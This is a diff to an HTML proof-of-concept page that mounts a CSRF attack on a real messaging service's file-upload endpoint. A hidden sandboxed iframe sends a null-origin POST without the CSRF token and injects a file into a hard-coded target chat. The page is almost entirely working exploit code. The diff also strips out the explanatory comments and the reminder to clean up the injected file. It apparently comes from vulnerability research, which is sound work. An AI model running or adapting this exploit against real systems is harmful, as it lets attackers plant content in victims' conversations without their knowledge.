@@ -3,7 +3,7 @@
 <head><meta charset="utf-8"><title>PoC — CSRF Upload via null-origin iframe</title></head>
 <body>
 <h3>CSRF Upload — null origin (sandboxed iframe)</h3>
-<p>Attacker origin: <b id="host"></b> &nbsp;|&nbsp; Iframe origin: <b>null</b></p>
+<p>Attacker origin: <b id="host"></b> &nbsp;|&nbsp; Spoofed Iframe origin: <b>null</b></p>
 <pre id="out" style="white-space:pre-wrap;word-break:break-all;margin-top:1em;"></pre>
 
 <iframe id="pwn" sandbox="allow-scripts" style="display:none"></iframe>
@@ -13,13 +13,10 @@ document.getElementById('host').textContent = location.origin;
 
 // ── CONFIG ────────────────────────────────────────────────────────────────────
 var TARGET_CHATID = "CT_1469007622159071968_3335514-GC";
-var FILE_NAME     = "important-invoice.txt";
-var FILE_BODY     = "This file was injected without the victim's knowledge (PoC 05b).";
+var FILE_NAME     = "exploit.txt";
+var FILE_BODY     = "This file was injected without the victim's knowledge.";
 // ─────────────────────────────────────────────────────────────────────────────
 
-// Build the inner script as a string — runs inside sandbox="allow-scripts" iframe
-// (no allow-same-origin) so the browser sends Origin: null on the XHR.
-// Headers matched exactly to the confirmed-working Burp request with Origin: null.
 var inner = '';
 inner += 'var xhr=new XMLHttpRequest();';
 inner += 'xhr.open("POST","https://files.arattai.in/webupload");';
@@ -29,7 +26,6 @@ inner += 'xhr.setRequestHeader("X-Arattai-Type","multi_recip");';
 inner += 'xhr.setRequestHeader("X-Arattai-Chatids",' + JSON.stringify(TARGET_CHATID) + ');';
 inner += 'xhr.setRequestHeader("File-Name",'          + JSON.stringify(FILE_NAME)     + ');';
 inner += 'xhr.setRequestHeader("X-Cliq-Content-Type","");';
-// X-Zcsrf-Token intentionally omitted — confirming server does not validate it
 inner += 'xhr.onload=function(){parent.postMessage({type:"done",status:xhr.status,body:xhr.responseText},"*");};';
 inner += 'xhr.onerror=function(){parent.postMessage({type:"err",msg:"CORS preflight blocked or network error"},"*");};';
 inner += 'xhr.send(' + JSON.stringify(FILE_BODY) + ');';
@@ -51,7 +47,6 @@ window.addEventListener('message', function(e) {
         if (d.status === 200) {
             log.textContent += '\n[CONFIRMED] Upload accepted without CSRF token via null-origin iframe.\n';
             log.textContent += '            Check chat: ' + TARGET_CHATID + '\n';
-            log.textContent += '            CLEANUP: delete the injected file from the chat.\n';
         } else {
             log.textContent += '[RESULT] HTTP ' + d.status + ' — rejected.\n';
         }
